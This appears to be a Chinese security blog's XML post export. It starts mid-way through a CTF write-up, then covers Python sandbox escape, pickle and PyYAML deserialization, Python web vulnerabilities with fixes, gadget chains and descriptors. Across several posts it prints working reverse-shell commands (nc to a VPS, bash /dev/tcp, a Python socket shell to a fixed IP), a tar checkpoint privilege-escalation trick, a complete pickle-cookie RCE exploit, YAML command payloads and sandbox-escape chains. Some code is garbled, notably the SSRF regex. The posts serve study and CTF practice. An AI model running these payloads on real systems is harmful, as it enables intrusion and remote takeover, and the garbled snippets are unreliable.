/tmp/lhennp; nc vps port 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp&quot; &gt; Str3am.shecho &quot; &quot; &gt; --checkpoint-action=exec=sh Str3amecho &quot; &quot; &gt; --checkpoint=1 上传即可反弹shell，flag用户权限，成功读取flag 学到的新东西 随机数种子预测，爆破种子 mongodb注入，利用各种操作符进行注入 format格式化字符串漏洞，继承链的构造 phar反序列化，这个早就想好好学一下，这次正好遇到了这种题目 filter_var($email,FILTER_VALIDATE_EMAIL)绕过，tar提权]]></content>
      <tags>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python沙箱逃逸2.0]]></title>
    <url>%2F2018%2F10%2F11%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B82-0%2F</url>
    <content type="text"><![CDATA[之前学了沙箱逃逸，最近看了inctf 2018的几道题的wp，学到了点逃逸绕过的新知识 题一前提黑名单 1subprocesses|os|import|builtins|eval|locals|class|;|file 目标执行以下poc来读取flag文件 1().__class__.__base__.__subclasses__()[40]("flag.txt").read() 绕过当__class__被过滤时，可以用下面的办法绕过 1234&gt;&gt;&gt; dir([])['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']&gt;&gt;&gt; dir([])[1]'__class__' 当__subclasses__被过滤时，可以用下面的方法绕过 1234&gt;&gt;&gt; dir(().__class__.__base__.__class__)['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__weakrefoffset__', 'mro']&gt;&gt;&gt; dir(().__class__.__base__.__class__)[34]'__subclasses__' 将以上两个rua一下，能得到__subclasses__的构造方法 1dir(getattr(getattr(getattr((), dir([])[1]),'__base__'), dir([])[1]))[34] 将以上几个一起rua，就能得到最终的poc 1getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'), dir([])[1]))[34])()[40]('flag').read() 题二前提黑名单 12345678910111213__class__subprocessesosimportbuiltinsevalfilegetattr[]forifopen_tt_append 目标执行以下代码读取flag文件 1globals()["__builtins__"].open("/flag").read() 绕过因为__builtins__和open被过滤，所以需要绕过 因为这里过滤了getattr和[]，所以不能用上一题的方法了，但是可以利用16进制进行绕过 12345&gt;&gt;&gt; '__builtins__'.encode('hex')'5f5f6275696c74696e735f5f'&gt;&gt;&gt; 'open'.encode('hex')'6f70656e'&gt;&gt;&gt; 所以最终的poc为 1globals().__getitem__(bytes.fromhex('5f5f6275696c74696e735f5f').decode('utf-8')).__getitem__(bytes.fromhex('6f70656e').decode('utf-8'))("/flag", "r").read() 但是这个poc我在本地用不了，python2和3都一样。不过这种思路还是值得好好学习一波]]></content>
      <tags>
        <tag>Python</tag>
        <tag>沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python反序列化]]></title>
    <url>%2F2018%2F10%2F10%2FPython%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[简单入手例子天不早了话不多说，直接从一个简单的例子入手Python反序列化 1234567891011121314#!/usr/bin/env python#coding: utf-8import cPickleimport osclass poc(object): def __reduce__(self): s = """ls""" return os.system, (s,) p = poc()poc = cPickle.dumps(e)print poc 运行结果为 1234567cposixsystemp1(S'ls'p2tRp3. 整理到一行，用\n代替换行 1cposix\nsystem\np1\n(S&apos;ls&apos;\np2\ntRp3\n. 反序列化得到： 1234&gt;&gt;&gt; import pickle&gt;&gt;&gt; data = "cposix\nsystem\np1\n(S'ls'\np2\ntRp3\n."&gt;&gt;&gt; pickle.loads(data)test.py 当发现反序列化的利用点是，就可以利用上面的脚本来构造poc 通过反序列化来反弹shell这个例子的原理其实就是执行任意系统命令，不过把命令换成了反弹shell的code罢了 1234567891011#!/usr/bin/env python# encoding: utf-8import osimport pickleclass test(object): def __reduce__(self): code='bash -c "bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/x 0&lt;&amp;1 2&gt;&amp;1"' return (os.system,(code,))a=test()c=pickle.dumps(a)pickle.loads(c) 这里我们用的是bash反弹，也可以用其他反弹方式，具体问题具体分析，然后在本地监听对应的端口就行了 不过我们可以通过sock网络编程了远程执行exp反弹shell，后面的例子我们会用到，这里先埋个伏笔 pickle数据格式及指令勾陈实验室对这一块写的很详细，我来总(抄)结(袭)一下 c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。 (：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。（就是左括号） t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。（相当于右括号） S：读取引号中的字符串直到换行符处，然后将它压入堆栈。（本行后面的是字符串） R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。（执行紧靠自己左边的一个括号对中的内容） .：结束pickle。 另外，__reduce\方法和PHP的wakeup方法一样，在被反序列化的时候被调用，所以一般我们构造poc的脚本都是用__reduce__方法 留个坑，没怎么懂 vulhub——python反序列化复现先来分析下代码 12345678910111213141516171819import pickleimport base64from flask import Flask, requestapp = Flask(__name__)@app.route("/")def index(): try: user = base64.b64decode(request.cookies.get('user')) user = pickle.loads(user) username = user["username"] except: username = "Guest" return "Hello %s" % usernameif __name__ == "__main__": app.run() 核心代码就在try代码块里，username取自cookie的user值的base64解码值，并且没有做任何安全措施就使用了的敏感的loads方法，user值是不可控的，可以构造恶意代码来进行攻击 再分析下环境提供的exp（稍作修改） 1234567891011121314151617181920#!/usr/bin/env python3import requestsimport pickleimport osimport base64class exp(object): def __reduce__(self): s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.10.6",8090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'""" return (os.system, (s,))e = exp()s = pickle.dumps(e)response = requests.get("http://10.211.55.17:8000/", cookies=dict( user=base64.b64encode(s).decode()))print(response.content) 将核心模块整理： 12345678910import socketimport subprocessimport oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("172.20.10.6",8090))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(["/bin/bash","-i"]) 首先是常规的套接字，然后写入相应的文件描述符，补充下Linux shell下的文件描述符： 123标准输入 (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; 标准输出 (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; 标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt; /bin/bash -i就是打开一个交互的bash，具体的linux下的shell反弹命令解析可以参考安全客的文章 然后在本机监听端口用exp打就能弹回shell了 PyYAML反序列化漏洞仍然从一个简单的例子入手 首先构造一个poc并写入一个yml文件 123456789101112import yamlimport osclass test: def __init__(self): os.system('ls')payload = yaml.dump(test())fp = open('1.yml','w')fp.write(payload)fp.close() 此时写入1.yml的文件的内容（即poc）为 1!!python/object:__main__.test &#123;&#125; 但是这个poc并不能直接被反序列化进行使用，因为__main__下并没有test类，我们需要将其改为生成poc的脚本文件名 1!!python/object:poc.test &#123;&#125; 接着我们将其导入并进行反序列化 123import yamlyaml.load(file('1.yml', 'r')) 运行这个脚本后发现执行了我们预先设定的’ls’命令 但是我们可以发现，poc就是执行了poc.py下的test类而已，如果我们想构造一个通用的poc呢，那么我们可以将其改为 1!!python/object:os.system ["ls"] 运行脚本后发现却报错了 我们从yaml源码constructor.py那里可以了解到 因此我们可以设置以下通用型poc 12!!python/object/apply:[os.system] [CMD]!!python/object/new:[os.system] [CMD] 其中[os.system]可以换成python中其他可以执行系统命令的方法 这个只是基本操作，也可以像上面一样将命令改为反弹shell的命令]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Python反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python_Web常见漏洞及修复方案]]></title>
    <url>%2F2018%2F10%2F09%2FPython-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[Python近几年被炒的火热，但是其安全问题并没有得到像PHP那样的重视，我们来聊一聊Python代码层面常见漏洞及其修复方法 SQL注入漏洞代码123456789def getuser(request): username = request.POST.get('username') query = 'select * from users where username = %s' % username connection = psycopg2.connect(dbname, user, host, password) curs = connection.cursor() curs.execute(query) res = curs.fetchall() connection.close() return res 可以看到那条SQL查询语句没有一点过滤，因此导致了SQL注入漏洞 防御方案：有两种防御方案，第一种就是直接过滤或者转义关键字，但是这种方案可能会出现被绕过的风险，所以我们采用第二种，参数化查询语句，类似于PHP里的PDO 123456789def getuser(request): username = request.POST.get('username') query = 'select * from users where username = %s' connection = psycopg2.connect(dbname, user, host, password) curs = connection.cursor() curs.execute(query, [username]) res = curs.fetchall() connection.close() return res 注意两段代码的第三行和第六行之间的区别 命令执行漏洞代码12345678def store_uploaded_file(request): uploaded_file = request.POST.get('filename') upload_dir_path = "static/uploads" if not os.path.exists(upload_dir_path): os.makedirs(upload_dir_path) cmd = "mv" + uploaded_file + "" + "%s" % upload_dir_path os.system(cmd) return 'static/uploads/%s' % uploaded_file 防御方案：允许执行预设命令，但禁止直行终端命令，即shell=False，否则还是会存在注入风险 12345678def store_uploaded_file(request): uploaded_file = request.POST.get('filename') upload_dir_path = "static/uploads" if not os.path.exists(upload_dir_path): os.makedirs(upload_dir_path) cmd = "mv" + uploaded_file + "" + "%s" % upload_dir_path subprocess.Popen(cmd, shell = False) return 'static/uploads/%s' % uploaded_file XSS漏洞代码：123def xss(request): name = request.GET['name'] return HttpResponse('hello, %s' % name) 可以看到，name参数未经过滤就直接传入了HttoResponse函数，导致了XSS漏洞 防御方案：123def xss(request): name = request.GET['name'] return render_to_response('hello.html', &#123;'name': name&#125;) 123hello.htmlhello, &#123;&#123; name &#125;&#125; 任意文件读取漏洞代码：1234url = req.REQUEST.get('url')response = urllib2.urlopen("url")html = response.read()print html 这是爬虫里常用的代码（简化），当url参数接收一个域名值时，爬虫便会爬取相应内容。但是如果我们传入的file协议的话：file:///etc/passwd，便能读取到敏感信息 防御方案：可以使用协议头验证 1234url = req.REQUEST.get('url')if not tmp_url.startswith(('http://','https://')): return_json = &#123;'success': 0, 'info': u'only http or https!'&#125; return HttpResponse(simplejson.dumps(return_json), mimetype = 'application/json') 但是说实话这个也不能算是防御方案，因为还是可以被绕过 比如我们传入参数http://www.test.com/evil.php，而eval.php的内容为 123&lt;? header("location://file/etc/passwd")?&gt; 就能绕过限制，除了协议头，更重要的是需要控制好权限以及过滤关键字和正则严格判断用户输入参数 HTTP头部注入漏洞代码123456url = sys.argv[1]tyr: info = urllib.request.urlopen(url).info() print(info)except urllib.error.URLError as e: print(e) 首先用nc监听一个端口 1nc -l -p 12345 然后传递一个正常的url参数进去 1python3 test.py http://127.0.0.1:12345/foo 可以看到，响应头为 12345GET /foo HTTP/1.1Accept-Encoding: identityHost: 127.0.0.1:12345Connection: closeUser-Agent: Python-urllib/3.5 可是如果我们传一个恶意构造的url参数进去呢 1python3 test.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo 响应头变成了 1234567GET /foo HTTP/1.1Accept-Encoding: identityUser-Agent: Python-urllib/3.4Host: 127.0.0.1X-injected: headerx-leftover: :12345Connection: close 那么这样的话我们就可以注入任意的HTTP头了 防御方案只用将python升到较新版本即可 SSRF漏洞代码1234if re.match(r192v 168(.((2[0-4]dl(2][5][0-5]l[01]?d?d))2)s", ip_ ,adress) or Vre.match ip. _adress) or Vre.match(r- ip_ address):raise BaseException(inner ip address attack") ssrf的常规防御方案就是判断IP是否属于内网，可以由于正则书写不规范，导致被绕过。比如上面的漏洞代码我们就可以利用八进制，十六进制，十进制，或者IP地址的省略写法 防御方案引用离别歌师傅的结论就是 解析目标URL，获取其Host 解析Host，获取Host指向的IP地址 检查IP地址是否为内网IP 请求URL 如果有跳转，拿出跳转URL，执行1 模版注入漏洞代码1234567891011@app.errorhandler(404)def page_not_found(e): template = '''&#123;%% block body %%&#125; &lt;div class="center-content error"&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &#123;%% endblock %%&#125;''' % (request.url) return render_template_string(template), 404 可以看到，代码并没有利用模版来渲染html，而是利用render_template_string()从一个字符串来渲染html，并且这个字符串是和用户输入(request.url)拼接的，这里就导致了代码域和数据域的混淆，就能导致各种利用方式 防御方案利用框架自带的沙盒环境来检查所有操作的变量，对于未注册的变量属性会抛出错误 沙盒逃逸漏洞代码1234567891011121314151617181920212223242526272829from __future__ import print_functionbanned = [ "import", "exec", "eval", "pickle", "os", "subprocess", "kevin sucks", "input", "banned", "sys", "cry sum more" ] targets = __builtins__.__dict__.keys() targets.remove('raw_input') targets.remove('print') for x in targets: del __builtins__.__dict__[x] while 1: data = request.args.get('code','') for no in banned: if no.lower() in data.lower(): print("opps,evil command: " + no) else: exec data 这是某次CTF比赛中的原题，过滤并不严格，还是可以逃逸 防御方案禁止引入敏感包，过滤危险函数，删除敏感包以及一些敏感方法 CSRF漏洞代码1234def my_view(request): c = &#123;&#125; c.update(request) return render_to_response("test.html", c) 可以看到没有任何的csrf防御方式就直接将传入的request参数传入了update方法 防御方案在一些重要的操作中一定要做好CSRF防御，特别是登陆，添加用户操作等。比如Django中就提供了CSRF的中间件django.middleware.csrf.CsrfViewMiddleware，将这个中间件写入到settings.py的中间件配置文件即可 以下是防御csrf的伪代码 1234def my_view(request): c = &#123;&#125; c.update(csrf(request)) return render_to_response("test.html", c) 文件上传任意文件上传防御方案 12def allowed_file(filename): return '.' in filename and filename.rsplit('.', 1)[1].lower() in ['txt', ...] ddos漏洞原因如果没有限制上传的文件大小的话，极有可能造成对服务器的ddos 防御方案这个两种防御方案，各自有各自的优劣，分为前段和后端的防御方式。如果防御方式放在前端，直接在html代码中的属性就能指定限制大小，但是可以通过抓包的方式绕过。如果放在后端，可以通过配置中间件的配置文件或者直接在后端代码中指定限制大小，但是如果上传的人数过多，会大大增加服务器的压力 目录穿越漏洞原因没有将文件名进行重命名已经服务器配置不当，从而导致将文件名作为路径解析 防御方案上传文件后将文件进行重命名操作 不安全的封装以eval为例，漏洞代码 12345678910def safe_eval(eval_str): try: #加入命名空间 safe_dict = &#123;&#125; safe_dict['True'] = True safe_dict['False'] = False return eval(eval_str,&#123;'__builtins__':None&#125;,safe_dict) except Exception,e: traceback.print_exc() return '' 可以看到将__builtins\滞空了，以为这样就能防止调用内置函数或方法 绕过方法 1234567&gt;&gt;&gt; s2="""... [x for x in ().__class__.__bases__[0].__subclasses__()... if x.__name__ == "zipimporter"][0](... "/home/xxlegend/eval_test/configobj-4.4.0-py2.5.egg").load_module(... "configobj").os.system("CMD")... """&gt;&gt;&gt; eval(s2,&#123;'__builtins__':&#123;&#125;&#125;)]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python构造链原理及分析方法]]></title>
    <url>%2F2018%2F09%2F28%2FPython%E6%9E%84%E9%80%A0%E9%93%BE%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[有时候我们在绕过python沙箱的时候，会遇到被过滤很多关键字或者有些敏感模块直接被删除的情况，关键字过滤估计只会出现在简单的ctf里吧，绕过方式很多，但这不是本文的重点，我们重点看看通过一条长长的利用链来绕过敏感模块 先看看几个经典的利用链 123[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')[].__class__.__bases__[0].__subclasses__()[73].__init__.__globals__['os'].system('ls') 之前一直没明白这种链条构造的原理，我们根据这个链条倒推回去，原理就很清晰了 首先需要知道的是，在2.7版本中，[].__class__.__bases__[0].__subclasses__()里面有好东西，里面好多库调用了我们需要的os模块，因此我了解的构造的一些利用链就是基于[].__class__.__bases__[0].__subclasses__()的 我们把这条基链拆开看看： 基础方法__class__()方法首先__class\()返回一个实例的类 1234567&gt;&gt;&gt; class Foo(object):... def bar(self):... pass...&gt;&gt;&gt; obj = Foo()&gt;&gt;&gt; print obj.__class____main__.Foo __bases__方法__bases__()返回一个父类 12345678910111213141516&gt;&gt;&gt; class Foo1(object):... def Bar1(self):... pass...&gt;&gt;&gt; class Foo2(Foo1):... pass...&gt;&gt;&gt; obj = Foo2()&gt;&gt;&gt; print obj.__class____main__.Foo2&gt;&gt;&gt;&gt;&gt;&gt; print obj.__class__.__bases__(&lt;class __main__.Foo1 at 0x10c959c18&gt;,)&gt;&gt;&gt;&gt;&gt;&gt; print obj.__class__.__bases__[0]__main__.Foo1 __bases__方法和__base__方法非常类似，常规情况下，__bases__[0]和__base__等价 __subclasses__()方法__subclases__()获取类的子类 1234567891011121314151617&gt;&gt;&gt; class Foo1(object):... def Bar1(self):... pass...&gt;&gt;&gt; class Foo2(Foo1):... pass...&gt;&gt;&gt; obj1 = Foo1&gt;&gt;&gt; print obj1.__subclasses__()[&lt;class '__main__.Foo2'&gt;]&gt;&gt;&gt;&gt;&gt;&gt; print obj1.__class__&lt;type 'type'&gt;&gt;&gt;&gt; print obj1.__class__.__bases__[0]&lt;type 'object'&gt;&gt;&gt;&gt; print obj1.__class__.__bases__[0].__subclasses__()[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'posix.stat_result'&gt;, &lt;type 'posix.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class '__main__.Foo1'&gt;, &lt;class '__main__.Foo1'&gt;] 那么这条基链的逻辑就清楚了，通过当前实例的类来访问其父类的所有子类，这个父类就是指的是object类 从上面的例子可以看到: 1[].__class__.__base__.__subclasses__() 的执行结果为object类的所有子类： 1[&lt;type 'type'&gt;, &lt;type 'weakref'&gt;, &lt;type 'weakcallableproxy'&gt;, &lt;type 'weakproxy'&gt;, &lt;type 'int'&gt;, &lt;type 'basestring'&gt;, &lt;type 'bytearray'&gt;, &lt;type 'list'&gt;, &lt;type 'NoneType'&gt;, &lt;type 'NotImplementedType'&gt;, &lt;type 'traceback'&gt;, &lt;type 'super'&gt;, &lt;type 'xrange'&gt;, &lt;type 'dict'&gt;, &lt;type 'set'&gt;, &lt;type 'slice'&gt;, &lt;type 'staticmethod'&gt;, &lt;type 'complex'&gt;, &lt;type 'float'&gt;, &lt;type 'buffer'&gt;, &lt;type 'long'&gt;, &lt;type 'frozenset'&gt;, &lt;type 'property'&gt;, &lt;type 'memoryview'&gt;, &lt;type 'tuple'&gt;, &lt;type 'enumerate'&gt;, &lt;type 'reversed'&gt;, &lt;type 'code'&gt;, &lt;type 'frame'&gt;, &lt;type 'builtin_function_or_method'&gt;, &lt;type 'instancemethod'&gt;, &lt;type 'function'&gt;, &lt;type 'classobj'&gt;, &lt;type 'dictproxy'&gt;, &lt;type 'generator'&gt;, &lt;type 'getset_descriptor'&gt;, &lt;type 'wrapper_descriptor'&gt;, &lt;type 'instance'&gt;, &lt;type 'ellipsis'&gt;, &lt;type 'member_descriptor'&gt;, &lt;type 'file'&gt;, &lt;type 'PyCapsule'&gt;, &lt;type 'cell'&gt;, &lt;type 'callable-iterator'&gt;, &lt;type 'iterator'&gt;, &lt;type 'sys.long_info'&gt;, &lt;type 'sys.float_info'&gt;, &lt;type 'EncodingMap'&gt;, &lt;type 'fieldnameiterator'&gt;, &lt;type 'formatteriterator'&gt;, &lt;type 'sys.version_info'&gt;, &lt;type 'sys.flags'&gt;, &lt;type 'exceptions.BaseException'&gt;, &lt;type 'module'&gt;, &lt;type 'imp.NullImporter'&gt;, &lt;type 'zipimport.zipimporter'&gt;, &lt;type 'posix.stat_result'&gt;, &lt;type 'posix.statvfs_result'&gt;, &lt;class 'warnings.WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._IterationGuard'&gt;, &lt;class '_weakrefset.WeakSet'&gt;, &lt;class '_abcoll.Hashable'&gt;, &lt;type 'classmethod'&gt;, &lt;class '_abcoll.Iterable'&gt;, &lt;class '_abcoll.Sized'&gt;, &lt;class '_abcoll.Container'&gt;, &lt;class '_abcoll.Callable'&gt;, &lt;class 'site._Printer'&gt;, &lt;class 'site._Helper'&gt;, &lt;type '_sre.SRE_Pattern'&gt;, &lt;type '_sre.SRE_Match'&gt;, &lt;type '_sre.SRE_Scanner'&gt;, &lt;class 'site.Quitter'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class '__main__.Foo1'&gt;, &lt;class '__main__.Foo1'&gt;, &lt;class '__main__.Foo1'&gt;, &lt;class '__main__.Foo'&gt;, &lt;class '__main__.Foo1'&gt;] 实例分析接下来我们以第一条构造链为例子具体分析下 1[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls') 我们可以看到，object类的第59个子类： 12&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()[59]&lt;class 'warnings.catch_warnings'&gt; 跟踪下这个warings.py，发现其包含了三个库 123import linecacheimport sysimport types 并且，当我们执行[].__class__.__bases__[0].__subclasses__()[59].__init__的时候，返回值用于构造函数初始化属性 12&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()[59].__init__&lt;unbound method catch_warnings.__init__&gt; 当执行[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__时，返回所有能用的模块及方法 12&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__&#123;'filterwarnings': &lt;function filterwarnings at 0x10ac675f0&gt;,..............此处省略 例如： 123456&gt;&gt;&gt; class Foo(object):... def Bar(self):... pass...&gt;&gt;&gt; print Foo.Bar.__globals__&#123;'obj1': &lt;class '__main__.Foo1'&gt;, 'obj2': &lt;class '__main__.Foo2'&gt;, 'obj': &lt;__main__.Foo object at 0x10ad42e10&gt;, '__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__doc__': None, 'Foo': &lt;class '__main__.Foo'&gt;, '__name__': '__main__', '__package__': None, 'Foo1': &lt;class '__main__.Foo1'&gt;, 'Foo2': &lt;class '__main__.Foo2'&gt;&#125; 需要注意的是，__globals\方法和__funcglobals\_作用是一样的 回到上面，我们提到warnings.py包含有三个模块 123import linecacheimport sysimport types 跟踪下这个linecache模块 12&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache']&lt;module 'linecache' from '/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/linecache.pyc'&gt; __dict__方法用来访问和实例相关的属性，当我们执行[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__时，可以看到含有os属性 1'os': &lt;module 'os' from '/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.pyc'&gt; 我们访问这个os属性就已经包含了os模块了 12&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os']&lt;module 'os' from '/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.pyc'&gt; 此时就可以执行系统命令了 12345&gt;&gt;&gt; [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')Applications Library Pictures hexoDesktop Movies Public sitesDocuments Music PycharmProjects 截图Downloads Parallels Seafile 分析方法就到这里为止]]></content>
      <tags>
        <tag>Python</tag>
        <tag>沙盒</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python学习之描述符]]></title>
    <url>%2F2018%2F09%2F27%2FPython%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[简介描述符是Python新式类中的关键点之一，其在2.2中被引进。描述符就类似对象属性的一个代理，当这个代理被调用时，就可以访问这个对象了 描述符协议Python描述符协议只是一种在模型中引用属性时指定将要发生时间的方法。它允许编程人员轻松、有效得管理属性访问 描述符可以是任何类（新式），这种类至少实现了以下三种特殊方法之一：__get__()、__set__()、__delete__()，这三个特殊方法充当描述符协议的作用。__get__()可以用于得到一个属性的值，换句话说，在访问一个属性值的时候，__get__()会被调用，另外两个特殊方法也是这样。 Python没有私有变量，描述符协议可以用来实现私有变量类似的功能。 不是所有的描述符都实现了__set__()方法，它们被当作非数据描述符来被引用。同时覆盖__get__()、__set__()的类被称作数据描述符，它比数据描述符更强大 综上所述，描述符就是一个具有绑定行为的对象属性，其属性访问将由描述符协议中的方法覆盖。如果这些方法中的任何一个针对某个对象定义，那么它就被认为是一个描述符 __getattribute__()和__getattr__特殊方法__getattr__()方法仅当属性不能在实例的__dict__或它的类或父类中找到时才被调用。而__getattribute__方法可以执行每一个属性访问，不仅仅是当属性不能被找到时。两者用法类似，不同之处在于：当属性被访问时，__getattribute__()方法一直被调用，不局限于不能被找到的情况 需要注意的时，如果出现在__getattribute__()中再次调用__getattribute__()就会进入无穷递归 可以说整个描述符系统的心脏就是__getattribute__()，因为对每个属性的实例都会调用到这个特殊的方法。这个方法被用来查找类的属性，同时也相当于一个代理，是你可以访问属性 如果一个实例调用了__get__()方法，可以传入了一个类型或类的对象，如：给定类X和实例x，x.foo由__getattribute__()转化为： 1type(x).__dict__['foo'].__get__(x, type(x)) 如果一个类调用了__get__()方法，那么None将被作为对象传入（实例传入的时self）: 1X.__dict__['foo'].__get__(None, X) 如果Super()被调用了，Y(X)的情况，用super(Y, obj).foo在obj.__class__.__mro__中紧接类Y沿着继承树来查找类X，然后调用： 1X.__dict__['foo'].__get__(obj, X) 然后描述符会负责返回需要的对象 优先级别__getattribute__()方法的执行方式的优先级别为： 类属性 数据描述符 实例属性 非数据描述符 默认__getattr__ 